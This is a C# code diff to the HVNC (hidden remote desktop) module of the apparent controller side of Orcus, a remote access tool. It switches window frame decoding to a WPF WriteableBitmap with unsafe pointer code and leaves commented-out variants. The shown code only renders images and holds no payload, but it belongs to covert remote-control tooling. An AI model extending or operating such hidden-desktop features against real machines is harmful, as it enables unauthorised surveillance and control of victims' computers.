@@ -4,6 +4,8 @@ using System.ComponentModel;
 using System.Drawing;
 using System.IO;
 using System.Runtime.CompilerServices;
+using System.Windows;
+using System.Windows.Media.Imaging;
 using Orcus.Shared.Commands.HVNC;
 using Orcus.Shared.Utilities.Compression;
 
@@ -31,10 +33,10 @@ namespace Orcus.Administration.Commands.HVNC
         public void Dispose()
         {
             _unsafeStreamCodec?.Dispose();
-            Image?.Dispose();
+            Image = null;
         }
 
-        public Bitmap Image { get; private set; }
+        public WriteableBitmap Image { get; private set; }
         public DateTime LastUpdate { get; private set; }
         public Int64 Handle { get; }
 
@@ -112,23 +114,34 @@ namespace Orcus.Administration.Commands.HVNC
             Title = windowInformation.Title;
         }
 
-        public void UpdateImage(byte[] data)
+        public unsafe void UpdateImage(byte[] data)
         {
-            var width = BitConverter.ToInt32(data, 0);
-            var height = BitConverter.ToInt32(data, 4);
+            int width = BitConverter.ToInt32(data, 0);
+            int height = BitConverter.ToInt32(data, 4);
 
             lock (RenderLock)
             {
                 if (_unsafeStreamCodec == null || _currentHeight != height || _currentWidth != width)
                 {
+                    _unsafeStreamCodec?.Dispose();
                     _currentWidth = width;
                     _currentHeight = height;
-                   // _unsafeStreamCodec = new UnsafeStreamCodec(90);
+                    _unsafeStreamCodec = new UnsafeStreamCodec(UnsafeStreamCodecParameters.None);
                 }
+                fixed (byte* dataPtr = data)
+                {
+                    Image = _unsafeStreamCodec.DecodeData(dataPtr, (uint)data.Length, Application.Current.Dispatcher);
+                }
+                //    Image = BitmapFromWriteableBitmap(_unsafeStreamCodec.DecodeData(dataPtr, (uint)data.Length +5, Application.Current.Dispatcher));
 
-               // using (var memoryStream = new MemoryStream(data, 8, data.Length - 8))
-                //    Image = _unsafeStreamCodec.DecodeData(memoryStream);
-
+                /*using (var memoryStream = new MemoryStream(data, 8, data.Length - 8))
+                {
+                    fixed (byte* dataPtr = memoryStream.ToArray())
+                    {
+                        Image = BitmapFromWriteableBitmap(_unsafeStreamCodec.DecodeData(dataPtr, (uint)memoryStream.Length, dp));
+                    }
+                }*/
+                //Image = _unsafeStreamCodec.DecodeData(memoryStream);
                 LastUpdate = DateTime.Now;
             }
         }
